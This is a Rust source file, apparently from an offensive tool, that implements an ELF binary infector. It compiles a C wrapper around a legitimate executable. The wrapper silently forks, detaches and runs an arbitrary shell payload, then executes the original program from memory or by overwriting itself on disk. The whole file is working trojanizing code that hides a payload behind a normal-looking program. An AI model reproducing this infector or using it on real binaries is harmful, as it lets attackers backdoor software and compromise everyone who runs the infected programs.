use crate::args;
use crate::errors::*;
use serde::{Deserialize, Serialize};
use std::fmt::Write;
use std::process::Stdio;
use tokio::fs::File;
use tokio::io::AsyncWrite;
use tokio::io::AsyncWriteExt;
use tokio::process::{ChildStdin, Command};

pub fn c_escape(data: &[u8], out: &mut String) -> Result<()> {
    for b in data {
        write!(out, "\\x{:02x}", b)?;
    }
    Ok(())
}

pub async fn c_stream_bin(orig: &[u8], stdin: &mut ChildStdin) -> Result<()> {
    debug!("Passing through binary...");
    let mut buf = String::new();
    for chunk in orig.chunks(2048) {
        buf.clear();
        c_escape(chunk, &mut buf)?;
        stdin.write_all(b"write(f, \"").await?;
        stdin.write_all(buf.as_bytes()).await?;
        stdin
            .write_all(format!("\", {});\n", chunk.len()).as_bytes())
            .await?;
    }
    Ok(())
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Infect {
    pub payload: String,
    #[serde(default)]
    pub self_replace: bool,
    pub assume_path: Option<String>,
}

impl TryFrom<args::InfectElf> for Infect {
    type Error = Error;

    fn try_from(args: args::InfectElf) -> Result<Self> {
        Ok(Infect {
            payload: args.payload,
            self_replace: args.self_replace,
            assume_path: args.assume_path,
        })
    }
}

pub struct Compiler {
    stdin: ChildStdin,
}

impl Compiler {
    pub async fn add_line(&mut self, line: &str) -> Result<()> {
        debug!("Sending to compiler: {:?}", line);
        self.stdin.write_all(line.as_bytes()).await?;
        Ok(())
    }

    pub async fn add_lines(&mut self, lines: &[&str]) -> Result<()> {
        for line in lines {
            self.add_line(line).await?;
        }
        Ok(())
    }
}

pub async fn infect<W: AsyncWrite + Unpin>(
    config: &Infect,
    orig: &[u8],
    out: &mut W,
) -> Result<()> {
    let dir = tempfile::tempdir()?;
    let bin = dir.path().join("bin");

    info!("Spawning C compiler...");
    let mut child = Command::new("gcc")
        .arg("-static")
        .arg("-s")
        .arg("-Os")
        .arg("-o")
        .arg(&bin)
        .arg("-xc")
        .arg("-")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .context("Failed to spawn C compiler")?;

    info!("Generating source code...");
    {
        let stdin = child.stdin.take().unwrap();
        let mut compiler = Compiler { stdin };
        let mut buf = String::new();
        c_escape(config.payload.as_bytes(), &mut buf)?;
        compiler.add_lines(&[
            "#define _GNU_SOURCE\n",
            "#include <stdio.h>\n",
            "#include <stdlib.h>\n",
            "#include <unistd.h>\n",
            "#include <fcntl.h>\n",
            "#include <sys/mman.h>\n",
            "#include <linux/limits.h>\n",
            "int main(int argc, char** argv) {\n",
            "pid_t c = fork();\n",
            "if (c) goto bin;\n",
            "setsid();\n",
            &format!("char *args[]={{\"/bin/sh\", \"-c\", \"{}\", NULL}};\n", buf),
            "execve(\"/bin/sh\", args, environ);\n",
            "exit(0);\n",
            "bin:\n",
        ]).await?;

        if config.self_replace {
            if let Some(assume_path) = &config.assume_path {
                buf.clear();
                c_escape(assume_path.as_bytes(), &mut buf)?;
                compiler.add_line(&format!("char *p=\"{}\";\n", buf)).await?;
            } else {
                compiler.add_lines(&[
                    "char p[PATH_MAX+1];\n",
                    "ssize_t n = readlink(\"/proc/self/exe\", p, sizeof(p)-1);\n",
                    "p[n]=0;\n",
                ]).await?;
            }
            compiler.add_lines(&[
                "unlink(p);\n",
                "int f = open(p, O_CREAT | O_TRUNC | O_WRONLY, 0755);\n",
            ]).await?;
            c_stream_bin(orig, &mut compiler.stdin).await?;
            compiler.add_lines(&[
                "close(f);\n",
                "execve(p, argv, environ);\n",
                "exit(1);\n",
                "}\n",
            ]).await?;
        } else {
            compiler.add_line("int f = memfd_create(\"\", MFD_CLOEXEC);\n").await?;
            c_stream_bin(orig, &mut compiler.stdin).await?;
            compiler.add_lines(&["fexecve(f, argv, environ);\n", "exit(1);\n", "}\n"]).await?;
        }
    }

    info!("Waiting for compile to finish...");
    let status = child.wait().await?;
    if !status.success() {
        bail!("Compile failed, compiler exited with {:?}", status);
    }

    debug!("Reading compiled binary back into memory");
    let mut f = File::open(&bin)
        .await
        .with_context(|| anyhow!("Failed top open compiled binary at {:?}", bin))?;
    tokio::io::copy(&mut f, out).await?;

    info!("Successfully generated binary");

    Ok(())
}
